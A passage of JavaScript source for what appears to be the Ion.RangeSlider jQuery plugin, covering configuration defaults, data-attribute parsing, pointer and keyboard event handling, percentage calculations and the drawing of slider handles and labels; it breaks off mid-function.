            grid: null,
            grid_labels: []
        };

        // storage for measure variables
        this.coords = {
            // left
            x_gap: 0,
            x_pointer: 0,

            // width
            w_rs: 0,
            w_rs_old: 0,
            w_handle: 0,

            // percents
            p_gap: 0,
            p_gap_left: 0,
            p_gap_right: 0,
            p_step: 0,
            p_pointer: 0,
            p_handle: 0,
            p_single_fake: 0,
            p_single_real: 0,
            p_from_fake: 0,
            p_from_real: 0,
            p_to_fake: 0,
            p_to_real: 0,
            p_bar_x: 0,
            p_bar_w: 0,

            // grid
            grid_gap: 0,
            big_num: 0,
            big: [],
            big_w: [],
            big_p: [],
            big_x: []
        };

        // storage for labels measure variables
        this.labels = {
            // width
            w_min: 0,
            w_max: 0,
            w_from: 0,
            w_to: 0,
            w_single: 0,

            // percents
            p_min: 0,
            p_max: 0,
            p_from_fake: 0,
            p_from_left: 0,
            p_to_fake: 0,
            p_to_left: 0,
            p_single_fake: 0,
            p_single_left: 0
        };



        /**
         * get and validate config
         */
        var $inp = this.$cache.input,
            val = $inp.prop("value"),
            config, config_from_data, prop;

        // default config
        config = {
            type: "single",

            min: 10,
            max: 100,
            from: null,
            to: null,
            step: 1,

            min_interval: 0,
            max_interval: 0,
            drag_interval: false,

            values: [],
            p_values: [],

            from_fixed: false,
            from_min: null,
            from_max: null,
            from_shadow: false,

            to_fixed: false,
            to_min: null,
            to_max: null,
            to_shadow: false,

            prettify_enabled: true,
            prettify_separator: " ",
            prettify: null,

            force_edges: false,

            keyboard: false,
            keyboard_step: 5,

            grid: false,
            grid_margin: true,
            grid_num: 4,
            grid_snap: false,

            hide_min_max: false,
            hide_from_to: false,

            prefix: "",
            postfix: "",
            max_postfix: "",
            decorate_both: true,
            values_separator: " â€” ",

            input_values_separator: ";",

            disable: false,

            onStart: null,
            onChange: null,
            onFinish: null,
            onUpdate: null
        };


        // check if base element is input
        if ($inp[0].nodeName !== "INPUT") {
            console && console.warn && console.warn("Base element should be <input>!", $inp[0]);
        }


        // config from data-attributes extends js config
        config_from_data = {
            type: $inp.data("type"),

            min: $inp.data("min"),
            max: $inp.data("max"),
            from: $inp.data("from"),
            to: $inp.data("to"),
            step: $inp.data("step"),

            min_interval: $inp.data("minInterval"),
            max_interval: $inp.data("maxInterval"),
            drag_interval: $inp.data("dragInterval"),

            values: $inp.data("values"),

            from_fixed: $inp.data("fromFixed"),
            from_min: $inp.data("fromMin"),
            from_max: $inp.data("fromMax"),
            from_shadow: $inp.data("fromShadow"),

            to_fixed: $inp.data("toFixed"),
            to_min: $inp.data("toMin"),
            to_max: $inp.data("toMax"),
            to_shadow: $inp.data("toShadow"),

            prettify_enabled: $inp.data("prettifyEnabled"),
            prettify_separator: $inp.data("prettifySeparator"),

            force_edges: $inp.data("forceEdges"),

            keyboard: $inp.data("keyboard"),
            keyboard_step: $inp.data("keyboardStep"),

            grid: $inp.data("grid"),
            grid_margin: $inp.data("gridMargin"),
            grid_num: $inp.data("gridNum"),
            grid_snap: $inp.data("gridSnap"),

            hide_min_max: $inp.data("hideMinMax"),
            hide_from_to: $inp.data("hideFromTo"),

            prefix: $inp.data("prefix"),
            postfix: $inp.data("postfix"),
            max_postfix: $inp.data("maxPostfix"),
            decorate_both: $inp.data("decorateBoth"),
            values_separator: $inp.data("valuesSeparator"),

            input_values_separator: $inp.data("inputValuesSeparator"),

            disable: $inp.data("disable")
        };
        config_from_data.values = config_from_data.values && config_from_data.values.split(",");

        for (prop in config_from_data) {
            if (config_from_data.hasOwnProperty(prop)) {
                if (config_from_data[prop] === undefined || config_from_data[prop] === "") {
                    delete config_from_data[prop];
                }
            }
        }


        // input value extends default config
        if (val !== undefined && val !== "") {
            val = val.split(config_from_data.input_values_separator || options.input_values_separator || ";");

            if (val[0] && val[0] == +val[0]) {
                val[0] = +val[0];
            }
            if (val[1] && val[1] == +val[1]) {
                val[1] = +val[1];
            }

            if (options && options.values && options.values.length) {
                config.from = val[0] && options.values.indexOf(val[0]);
                config.to = val[1] && options.values.indexOf(val[1]);
            } else {
                config.from = val[0] && +val[0];
                config.to = val[1] && +val[1];
            }
        }



        // js config extends default config
        $.extend(config, options);


        // data config extends config
        $.extend(config, config_from_data);
        this.options = config;



        // validate config, to be sure that all data types are correct
        this.update_check = {};
        this.validate();



        // default result object, returned to callbacks
        this.result = {
            input: this.$cache.input,
            slider: null,

            min: this.options.min,
            max: this.options.max,

            from: this.options.from,
            from_percent: 0,
            from_value: null,

            to: this.options.to,
            to_percent: 0,
            to_value: null
        };



        this.init();
    };

    IonRangeSlider.prototype = {

        /**
         * Starts or updates the plugin instance
         *
         * @param [is_update] {boolean}
         */
        init: function (is_update) {
            this.no_diapason = false;
            this.coords.p_step = this.convertToPercent(this.options.step, true);

            this.target = "base";

            this.toggleInput();
            this.append();
            this.setMinMax();

            if (is_update) {
                this.force_redraw = true;
                this.calc(true);

                // callbacks called
                this.callOnUpdate();
            } else {
                this.force_redraw = true;
                this.calc(true);

                // callbacks called
                this.callOnStart();
            }

            this.updateScene();
        },

        /**
         * Appends slider template to a DOM
         */
        append: function () {
            var container_html = '<span class="irs js-irs-' + this.plugin_count + '"></span>';
            this.$cache.input.before(container_html);
            this.$cache.input.prop("readonly", true);
            this.$cache.cont = this.$cache.input.prev();
            this.result.slider = this.$cache.cont;

            this.$cache.cont.html(base_html);
            this.$cache.rs = this.$cache.cont.find(".irs");
            this.$cache.min = this.$cache.cont.find(".irs-min");
            this.$cache.max = this.$cache.cont.find(".irs-max");
            this.$cache.from = this.$cache.cont.find(".irs-from");
            this.$cache.to = this.$cache.cont.find(".irs-to");
            this.$cache.single = this.$cache.cont.find(".irs-single");
            this.$cache.bar = this.$cache.cont.find(".irs-bar");
            this.$cache.line = this.$cache.cont.find(".irs-line");
            this.$cache.grid = this.$cache.cont.find(".irs-grid");

            if (this.options.type === "single") {
                this.$cache.cont.append(single_html);
                this.$cache.edge = this.$cache.cont.find(".irs-bar-edge");
                this.$cache.s_single = this.$cache.cont.find(".single");
                this.$cache.from[0].style.visibility = "hidden";
                this.$cache.to[0].style.visibility = "hidden";
                this.$cache.shad_single = this.$cache.cont.find(".shadow-single");
            } else {
                this.$cache.cont.append(double_html);
                this.$cache.s_from = this.$cache.cont.find(".from");
                this.$cache.s_to = this.$cache.cont.find(".to");
                this.$cache.shad_from = this.$cache.cont.find(".shadow-from");
                this.$cache.shad_to = this.$cache.cont.find(".shadow-to");

                this.setTopHandler();
            }

            if (this.options.hide_from_to) {
                this.$cache.from[0].style.display = "none";
                this.$cache.to[0].style.display = "none";
                this.$cache.single[0].style.display = "none";
            }

            this.appendGrid();

            if (this.options.disable) {
                this.appendDisableMask();
                this.$cache.input[0].disabled = true;
            } else {
                this.$cache.cont.removeClass("irs-disabled");
                this.$cache.input[0].disabled = false;
                this.bindEvents();
            }

            if (this.options.drag_interval) {
                this.$cache.bar[0].style.cursor = "ew-resize";
            }
        },

        /**
         * Determine which handler has a priority
         * works only for double slider type
         */
        setTopHandler: function () {
            var min = this.options.min,
                max = this.options.max,
                from = this.options.from,
                to = this.options.to;

            if (from > min && to === max) {
                this.$cache.s_from.addClass("type_last");
            } else if (to < max) {
                this.$cache.s_to.addClass("type_last");
            }
        },

        /**
         * Determine which handles was clicked last
         * and which handler should have hover effect
         *
         * @param target {String}
         */
        changeLevel: function (target) {
            switch (target) {
                case "single":
                    this.coords.p_gap = this.toFixed(this.coords.p_pointer - this.coords.p_single_fake);
                    break;
                case "from":
                    this.coords.p_gap = this.toFixed(this.coords.p_pointer - this.coords.p_from_fake);
                    this.$cache.s_from.addClass("state_hover");
                    this.$cache.s_from.addClass("type_last");
                    this.$cache.s_to.removeClass("type_last");
                    break;
                case "to":
                    this.coords.p_gap = this.toFixed(this.coords.p_pointer - this.coords.p_to_fake);
                    this.$cache.s_to.addClass("state_hover");
                    this.$cache.s_to.addClass("type_last");
                    this.$cache.s_from.removeClass("type_last");
                    break;
                case "both":
                    this.coords.p_gap_left = this.toFixed(this.coords.p_pointer - this.coords.p_from_fake);
                    this.coords.p_gap_right = this.toFixed(this.coords.p_to_fake - this.coords.p_pointer);
                    this.$cache.s_to.removeClass("type_last");
                    this.$cache.s_from.removeClass("type_last");
                    break;
            }
        },

        /**
         * Then slider is disabled
         * appends extra layer with opacity
         */
        appendDisableMask: function () {
            this.$cache.cont.append(disable_html);
            this.$cache.cont.addClass("irs-disabled");
        },

        /**
         * Remove slider instance
         * and ubind all events
         */
        remove: function () {
            this.$cache.cont.remove();
            this.$cache.cont = null;

            this.$cache.line.off("keydown.irs_" + this.plugin_count);

            this.$cache.body.off("touchmove.irs_" + this.plugin_count);
            this.$cache.body.off("mousemove.irs_" + this.plugin_count);

            this.$cache.win.off("touchend.irs_" + this.plugin_count);
            this.$cache.win.off("mouseup.irs_" + this.plugin_count);

            if (is_old_ie) {
                this.$cache.body.off("mouseup.irs_" + this.plugin_count);
                this.$cache.body.off("mouseleave.irs_" + this.plugin_count);
            }

            this.$cache.grid_labels = [];
            this.coords.big = [];
            this.coords.big_w = [];
            this.coords.big_p = [];
            this.coords.big_x = [];

            cancelAnimationFrame(this.raf_id);
        },

        /**
         * bind all slider events
         */
        bindEvents: function () {
            if (this.no_diapason) {
                return;
            }

            this.$cache.body.on("touchmove.irs_" + this.plugin_count, this.pointerMove.bind(this));
            this.$cache.body.on("mousemove.irs_" + this.plugin_count, this.pointerMove.bind(this));

            this.$cache.win.on("touchend.irs_" + this.plugin_count, this.pointerUp.bind(this));
            this.$cache.win.on("mouseup.irs_" + this.plugin_count, this.pointerUp.bind(this));

            this.$cache.line.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
            this.$cache.line.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));

            if (this.options.drag_interval && this.options.type === "double") {
                this.$cache.bar.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "both"));
                this.$cache.bar.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "both"));
            } else {
                this.$cache.bar.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
                this.$cache.bar.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
            }

            if (this.options.type === "single") {
                this.$cache.single.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "single"));
                this.$cache.s_single.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "single"));
                this.$cache.shad_single.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));

                this.$cache.single.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "single"));
                this.$cache.s_single.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "single"));
                this.$cache.edge.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
                this.$cache.shad_single.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
            } else {
                this.$cache.single.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, null));
                this.$cache.single.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, null));

                this.$cache.from.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "from"));
                this.$cache.s_from.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "from"));
                this.$cache.to.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "to"));
                this.$cache.s_to.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "to"));
                this.$cache.shad_from.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
                this.$cache.shad_to.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));

                this.$cache.from.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "from"));
                this.$cache.s_from.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "from"));
                this.$cache.to.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "to"));
                this.$cache.s_to.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "to"));
                this.$cache.shad_from.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
                this.$cache.shad_to.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"));
            }

            if (this.options.keyboard) {
                this.$cache.line.on("keydown.irs_" + this.plugin_count, this.key.bind(this, "keyboard"));
            }

            if (is_old_ie) {
                this.$cache.body.on("mouseup.irs_" + this.plugin_count, this.pointerUp.bind(this));
                this.$cache.body.on("mouseleave.irs_" + this.plugin_count, this.pointerUp.bind(this));
            }
        },

        /**
         * Mousemove or touchmove
         * only for handlers
         *
         * @param e {Object} event object
         */
        pointerMove: function (e) {
            if (!this.dragging) {
                return;
            }

            var x = e.pageX || e.originalEvent.touches && e.originalEvent.touches[0].pageX;
            this.coords.x_pointer = x - this.coords.x_gap;

            this.calc();
        },

        /**
         * Mouseup or touchend
         * only for handlers
         *
         * @param e {Object} event object
         */
        pointerUp: function (e) {
            if (this.current_plugin !== this.plugin_count) {
                return;
            }

            if (this.is_active) {
                this.is_active = false;
            } else {
                return;
            }

            this.$cache.cont.find(".state_hover").removeClass("state_hover");

            this.force_redraw = true;

            if (is_old_ie) {
                $("*").prop("unselectable", false);
            }

            this.updateScene();
            this.restoreOriginalMinInterval();

            // callbacks call
            if ($.contains(this.$cache.cont[0], e.target) || this.dragging) {
                this.callOnFinish();
            }
            
            this.dragging = false;
        },

        /**
         * Mousedown or touchstart
         * only for handlers
         *
         * @param target {String|null}
         * @param e {Object} event object
         */
        pointerDown: function (target, e) {
            e.preventDefault();
            var x = e.pageX || e.originalEvent.touches && e.originalEvent.touches[0].pageX;
            if (e.button === 2) {
                return;
            }

            if (target === "both") {
                this.setTempMinInterval();
            }

            if (!target) {
                target = this.target || "from";
            }

            this.current_plugin = this.plugin_count;
            this.target = target;

            this.is_active = true;
            this.dragging = true;

            this.coords.x_gap = this.$cache.rs.offset().left;
            this.coords.x_pointer = x - this.coords.x_gap;

            this.calcPointerPercent();
            this.changeLevel(target);

            if (is_old_ie) {
                $("*").prop("unselectable", true);
            }

            this.$cache.line.trigger("focus");

            this.updateScene();
        },

        /**
         * Mousedown or touchstart
         * for other slider elements, like diapason line
         *
         * @param target {String}
         * @param e {Object} event object
         */
        pointerClick: function (target, e) {
            e.preventDefault();
            var x = e.pageX || e.originalEvent.touches && e.originalEvent.touches[0].pageX;
            if (e.button === 2) {
                return;
            }

            this.current_plugin = this.plugin_count;
            this.target = target;

            this.is_click = true;
            this.coords.x_gap = this.$cache.rs.offset().left;
            this.coords.x_pointer = +(x - this.coords.x_gap).toFixed();

            this.force_redraw = true;
            this.calc();

            this.$cache.line.trigger("focus");
        },

        /**
         * Keyborard controls for focused slider
         *
         * @param target {String}
         * @param e {Object} event object
         * @returns {boolean|undefined}
         */
        key: function (target, e) {
            if (this.current_plugin !== this.plugin_count || e.altKey || e.ctrlKey || e.shiftKey || e.metaKey) {
                return;
            }

            switch (e.which) {
                case 83: // W
                case 65: // A
                case 40: // DOWN
                case 37: // LEFT
                    e.preventDefault();
                    this.moveByKey(false);
                    break;

                case 87: // S
                case 68: // D
                case 38: // UP
                case 39: // RIGHT
                    e.preventDefault();
                    this.moveByKey(true);
                    break;
            }

            return true;
        },

        /**
         * Move by key. Beta
         * @todo refactor than have plenty of time
         *
         * @param right {boolean} direction to move
         */
        moveByKey: function (right) {
            var p = this.coords.p_pointer;

            if (right) {
                p += this.options.keyboard_step;
            } else {
                p -= this.options.keyboard_step;
            }

            this.coords.x_pointer = this.toFixed(this.coords.w_rs / 100 * p);
            this.is_key = true;
            this.calc();
        },

        /**
         * Set visibility and content
         * of Min and Max labels
         */
        setMinMax: function () {
            if (!this.options) {
                return;
            }

            if (this.options.hide_min_max) {
                this.$cache.min[0].style.display = "none";
                this.$cache.max[0].style.display = "none";
                return;
            }

            if (this.options.values.length) {
                this.$cache.min.html(this.decorate(this.options.p_values[this.options.min]));
                this.$cache.max.html(this.decorate(this.options.p_values[this.options.max]));
            } else {
                this.$cache.min.html(this.decorate(this._prettify(this.options.min), this.options.min));
                this.$cache.max.html(this.decorate(this._prettify(this.options.max), this.options.max));
            }

            this.labels.w_min = this.$cache.min.outerWidth(false);
            this.labels.w_max = this.$cache.max.outerWidth(false);
        },

        /**
         * Then dragging interval, prevent interval collapsing
         * using min_interval option
         */
        setTempMinInterval: function () {
            var interval = this.result.to - this.result.from;

            if (this.old_min_interval === null) {
                this.old_min_interval = this.options.min_interval;
            }

            this.options.min_interval = interval;
        },

        /**
         * Restore min_interval option to original
         */
        restoreOriginalMinInterval: function () {
            if (this.old_min_interval !== null) {
                this.options.min_interval = this.old_min_interval;
                this.old_min_interval = null;
            }
        },



        // =============================================================================================================
        // Calculations

        /**
         * All calculations and measures start here
         *
         * @param update {boolean=}
         */
        calc: function (update) {
            if (!this.options) {
                return;
            }

            this.calc_count++;

            if (this.calc_count === 10 || update) {
                this.calc_count = 0;
                this.coords.w_rs = this.$cache.rs.outerWidth(false);

                this.calcHandlePercent();
            }

            if (!this.coords.w_rs) {
                return;
            }

            this.calcPointerPercent();
            var handle_x = this.getHandleX();


            if (this.target === "both") {
                this.coords.p_gap = 0;
                handle_x = this.getHandleX();
            }

            if (this.target === "click") {
                this.coords.p_gap = this.coords.p_handle / 2;
                handle_x = this.getHandleX();

                if (this.options.drag_interval) {
                    this.target = "both_one";
                } else {
                    this.target = this.chooseHandle(handle_x);
                }
            }

            switch (this.target) {
                case "base":
                    var w = (this.options.max - this.options.min) / 100,
                        f = (this.result.from - this.options.min) / w,
                        t = (this.result.to - this.options.min) / w;

                    this.coords.p_single_real = this.toFixed(f);
                    this.coords.p_from_real = this.toFixed(f);
                    this.coords.p_to_real = this.toFixed(t);

                    this.coords.p_single_real = this.checkDiapason(this.coords.p_single_real, this.options.from_min, this.options.from_max);
                    this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max);
                    this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max);

                    this.coords.p_single_fake = this.convertToFakePercent(this.coords.p_single_real);
                    this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real);
                    this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real);

                    this.target = null;

                    break;

                case "single":
                    if (this.options.from_fixed) {
                        break;
                    }

                    this.coords.p_single_real = this.convertToRealPercent(handle_x);
                    this.coords.p_single_real = this.calcWithStep(this.coords.p_single_real);
                    this.coords.p_single_real = this.checkDiapason(this.coords.p_single_real, this.options.from_min, this.options.from_max);

                    this.coords.p_single_fake = this.convertToFakePercent(this.coords.p_single_real);

                    break;

                case "from":
                    if (this.options.from_fixed) {
                        break;
                    }

                    this.coords.p_from_real = this.convertToRealPercent(handle_x);
                    this.coords.p_from_real = this.calcWithStep(this.coords.p_from_real);
                    if (this.coords.p_from_real > this.coords.p_to_real) {
                        this.coords.p_from_real = this.coords.p_to_real;
                    }
                    this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max);
                    this.coords.p_from_real = this.checkMinInterval(this.coords.p_from_real, this.coords.p_to_real, "from");
                    this.coords.p_from_real = this.checkMaxInterval(this.coords.p_from_real, this.coords.p_to_real, "from");

                    this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real);

                    break;

                case "to":
                    if (this.options.to_fixed) {
                        break;
                    }

                    this.coords.p_to_real = this.convertToRealPercent(handle_x);
                    this.coords.p_to_real = this.calcWithStep(this.coords.p_to_real);
                    if (this.coords.p_to_real < this.coords.p_from_real) {
                        this.coords.p_to_real = this.coords.p_from_real;
                    }
                    this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max);
                    this.coords.p_to_real = this.checkMinInterval(this.coords.p_to_real, this.coords.p_from_real, "to");
                    this.coords.p_to_real = this.checkMaxInterval(this.coords.p_to_real, this.coords.p_from_real, "to");

                    this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real);

                    break;

                case "both":
                    if (this.options.from_fixed || this.options.to_fixed) {
                        break;
                    }

                    handle_x = this.toFixed(handle_x + (this.coords.p_handle * 0.001));

                    this.coords.p_from_real = this.convertToRealPercent(handle_x) - this.coords.p_gap_left;
                    this.coords.p_from_real = this.calcWithStep(this.coords.p_from_real);
                    this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max);
                    this.coords.p_from_real = this.checkMinInterval(this.coords.p_from_real, this.coords.p_to_real, "from");
                    this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real);

                    this.coords.p_to_real = this.convertToRealPercent(handle_x) + this.coords.p_gap_right;
                    this.coords.p_to_real = this.calcWithStep(this.coords.p_to_real);
                    this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max);
                    this.coords.p_to_real = this.checkMinInterval(this.coords.p_to_real, this.coords.p_from_real, "to");
                    this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real);

                    break;

                case "both_one":
                    if (this.options.from_fixed || this.options.to_fixed) {
                        break;
                    }

                    var real_x = this.convertToRealPercent(handle_x),
                        from = this.result.from_percent,
                        to = this.result.to_percent,
                        full = to - from,
                        half = full / 2,
                        new_from = real_x - half,
                        new_to = real_x + half;

                    if (new_from < 0) {
                        new_from = 0;
                        new_to = new_from + full;
                    }

                    if (new_to > 100) {
                        new_to = 100;
                        new_from = new_to - full;
                    }

                    this.coords.p_from_real = this.calcWithStep(new_from);
                    this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max);
                    this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real);

                    this.coords.p_to_real = this.calcWithStep(new_to);
                    this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max);
                    this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real);

                    break;
            }

            if (this.options.type === "single") {
                this.coords.p_bar_x = (this.coords.p_handle / 2);
                this.coords.p_bar_w = this.coords.p_single_fake;

                this.result.from_percent = this.coords.p_single_real;
                this.result.from = this.convertToValue(this.coords.p_single_real);

                if (this.options.values.length) {
                    this.result.from_value = this.options.values[this.result.from];
                }
            } else {
                this.coords.p_bar_x = this.toFixed(this.coords.p_from_fake + (this.coords.p_handle / 2));
                this.coords.p_bar_w = this.toFixed(this.coords.p_to_fake - this.coords.p_from_fake);

                this.result.from_percent = this.coords.p_from_real;
                this.result.from = this.convertToValue(this.coords.p_from_real);
                this.result.to_percent = this.coords.p_to_real;
                this.result.to = this.convertToValue(this.coords.p_to_real);

                if (this.options.values.length) {
                    this.result.from_value = this.options.values[this.result.from];
                    this.result.to_value = this.options.values[this.result.to];
                }
            }

            this.calcMinMax();
            this.calcLabels();
        },


        /**
         * calculates pointer X in percent
         */
        calcPointerPercent: function () {
            if (!this.coords.w_rs) {
                this.coords.p_pointer = 0;
                return;
            }

            if (this.coords.x_pointer < 0 || isNaN(this.coords.x_pointer)  ) {
                this.coords.x_pointer = 0;
            } else if (this.coords.x_pointer > this.coords.w_rs) {
                this.coords.x_pointer = this.coords.w_rs;
            }

            this.coords.p_pointer = this.toFixed(this.coords.x_pointer / this.coords.w_rs * 100);
        },

        convertToRealPercent: function (fake) {
            var full = 100 - this.coords.p_handle;
            return fake / full * 100;
        },

        convertToFakePercent: function (real) {
            var full = 100 - this.coords.p_handle;
            return real / 100 * full;
        },

        getHandleX: function () {
            var max = 100 - this.coords.p_handle,
                x = this.toFixed(this.coords.p_pointer - this.coords.p_gap);

            if (x < 0) {
                x = 0;
            } else if (x > max) {
                x = max;
            }

            return x;
        },

        calcHandlePercent: function () {
            if (this.options.type === "single") {
                this.coords.w_handle = this.$cache.s_single.outerWidth(false);
            } else {
                this.coords.w_handle = this.$cache.s_from.outerWidth(false);
            }

            this.coords.p_handle = this.toFixed(this.coords.w_handle / this.coords.w_rs * 100);
        },

        /**
         * Find closest handle to pointer click
         *
         * @param real_x {Number}
         * @returns {String}
         */
        chooseHandle: function (real_x) {
            if (this.options.type === "single") {
                return "single";
            } else {
                var m_point = this.coords.p_from_real + ((this.coords.p_to_real - this.coords.p_from_real) / 2);
                if (real_x >= m_point) {
                    return this.options.to_fixed ? "from" : "to";
                } else {
                    return this.options.from_fixed ? "to" : "from";
                }
            }
        },

        /**
         * Measure Min and Max labels width in percent
         */
        calcMinMax: function () {
            if (!this.coords.w_rs) {
                return;
            }

            this.labels.p_min = this.labels.w_min / this.coords.w_rs * 100;
            this.labels.p_max = this.labels.w_max / this.coords.w_rs * 100;
        },

        /**
         * Measure labels width and X in percent
         */
        calcLabels: function () {
            if (!this.coords.w_rs || this.options.hide_from_to) {
                return;
            }

            if (this.options.type === "single") {

                this.labels.w_single = this.$cache.single.outerWidth(false);
                this.labels.p_single_fake = this.labels.w_single / this.coords.w_rs * 100;
                this.labels.p_single_left = this.coords.p_single_fake + (this.coords.p_handle / 2) - (this.labels.p_single_fake / 2);
                this.labels.p_single_left = this.checkEdges(this.labels.p_single_left, this.labels.p_single_fake);

            } else {

                this.labels.w_from = this.$cache.from.outerWidth(false);
                this.labels.p_from_fake = this.labels.w_from / this.coords.w_rs * 100;
                this.labels.p_from_left = this.coords.p_from_fake + (this.coords.p_handle / 2) - (this.labels.p_from_fake / 2);
                this.labels.p_from_left = this.toFixed(this.labels.p_from_left);
                this.labels.p_from_left = this.checkEdges(this.labels.p_from_left, this.labels.p_from_fake);

                this.labels.w_to = this.$cache.to.outerWidth(false);
                this.labels.p_to_fake = this.labels.w_to / this.coords.w_rs * 100;
                this.labels.p_to_left = this.coords.p_to_fake + (this.coords.p_handle / 2) - (this.labels.p_to_fake / 2);
                this.labels.p_to_left = this.toFixed(this.labels.p_to_left);
                this.labels.p_to_left = this.checkEdges(this.labels.p_to_left, this.labels.p_to_fake);

                this.labels.w_single = this.$cache.single.outerWidth(false);
                this.labels.p_single_fake = this.labels.w_single / this.coords.w_rs * 100;
                this.labels.p_single_left = ((this.labels.p_from_left + this.labels.p_to_left + this.labels.p_to_fake) / 2) - (this.labels.p_single_fake / 2);
                this.labels.p_single_left = this.toFixed(this.labels.p_single_left);
                this.labels.p_single_left = this.checkEdges(this.labels.p_single_left, this.labels.p_single_fake);

            }
        },



        // =============================================================================================================
        // Drawings

        /**
         * Main function called in request animation frame
         * to update everything
         */
        updateScene: function () {
            if (this.raf_id) {
                cancelAnimationFrame(this.raf_id);
                this.raf_id = null;
            }

            clearTimeout(this.update_tm);
            this.update_tm = null;

            if (!this.options) {
                return;
            }

            this.drawHandles();

            if (this.is_active) {
                this.raf_id = requestAnimationFrame(this.updateScene.bind(this));
            } else {
                this.update_tm = setTimeout(this.updateScene.bind(this), 300);
            }
        },

        /**
         * Draw handles
         */
        drawHandles: function () {
            this.coords.w_rs = this.$cache.rs.outerWidth(false);

            if (!this.coords.w_rs) {
                return;
            }

            if (this.coords.w_rs !== this.coords.w_rs_old) {
                this.target = "base";
                this.is_resize = true;
            }

            if (this.coords.w_rs !== this.coords.w_rs_old || this.force_redraw) {
                this.setMinMax();
                this.calc(true);
                this.drawLabels();
                if (this.options.grid) {
                    this.calcGridMargin();
                    this.calcGridLabels();
                }
                this.force_redraw = true;
                this.coords.w_rs_old = this.coords.w_rs;
                this.drawShadow();
            }

            if (!this.coords.w_rs) {
                return;
            }

            if (!this.dragging && !this.force_redraw && !this.is_key) {
                return;
            }

            if (this.old_from !== this.result.from || this.old_to !== this.result.to || this.force_redraw || this.is_key) {

                this.drawLabels();

                this.$cache.bar[0].style.left = this.coords.p_bar_x + "%";
                this.$cache.bar[0].style.width = this.coords.p_bar_w + "%";

                if (this.options.type === "single") {
                    this.$cache.s_single[0].style.left = this.coords.p_single_fake + "%";

                    this.$cache.single[0].style.left = this.labels.p_single_left + "%";
                } else {
                    this.$cache.s_from[0].style.left = this.coords.p_from_fake + "%";
                    this.$cache.s_to[0].style.left = this.coords.p_to_fake + "%";

                    if (this.old_from !== this.result.from || this.force_redraw) {
                        this.$cache.from[0].style.left = this.labels.p_from_left + "%";
                    }
                    if (this.old_to !== this.result.to || this.force_redraw) {
                        this.$cache.to[0].style.left = this.labels.p_to_left + "%";
                    }

                    this.$cache.single[0].style.left = this.labels.p_single_left + "%";
                }

                this.writeToInput();

                if ((this.old_from !== this.result.from || this.old_to !== this.result.to) && !this.is_start) {
                    this.$cache.input.trigger("change");
                    this.$cache.input.trigger("input");
                }

                this.old_from = this.result.from;
                this.old_to = this.result.to;

                // callbacks call
                if (!this.is_resize && !this.is_update && !this.is_start && !this.is_finish) {
                    this.callOnChange();
                }
                if (this.is_key || this.is_click) {
                    this.is_key = false;
                    this.is_click = false;
                    this.callOnFinish();
                }

                this.is_update = false;
                this.is_resize = false;
                this.is_finish = false;
            }

            this.is_start = false;
            this.is_key = false;
            this.is_click = false;
            this.force_redraw = false;
        },

        /**
         * Draw labels
         * measure labels collisions
         * collapse close labels
         */
        drawLabels: function () {
            if (!this.options) {
                return;
            }

            var values_num = this.options.values.length,
                p_values = this.options.p_values,
                text_single,
                text_from,
                text_to;

            if (this.options.hide_from_to) {
                return;
            }

            if (this.options.type === "single") {

                if (values_num) {
                    text_single = this.decorate(p_values[this.result.from]);
                    this.$cache.single.html(text_single);
                } else {
                    text_single = this.decorate(this._prettify(this.result.from), this.result.from);
                    this.$cache.single.html(text_single);
                }

                this.calcLabels();

                if (this.labels.p_single_left < this.labels.p_min + 1) {
                    this.$cache.min[0].style.visibility = "hidden";
                } else {
                    this.$cache.min[0].style.visibility = "visible";
                }

                if (this.labels.p_single_left + this.labels.p_single_fake > 100 - this.labels.p_max - 1) {
                    this.$cache.max[0].style.visibility = "hidden";
                } else {
